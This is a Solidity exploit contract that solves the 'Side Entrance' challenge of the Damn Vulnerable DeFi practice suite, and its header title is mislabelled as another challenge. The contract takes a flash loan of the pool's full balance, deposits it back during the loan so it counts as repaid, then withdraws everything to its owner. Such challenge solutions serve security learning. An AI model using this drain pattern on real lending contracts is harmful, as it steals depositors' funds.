// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title ReceiverUnstoppable
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceExploit {
    SideEntranceLenderPool private immutable pool;

    address private immutable owner;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    receive() external payable {}

    fallback() external payable {}

    // Pool will call this function during the flash loan
    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function executeExploit() external {
        require(msg.sender == owner, "Only owner can execute flash loan");
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }
}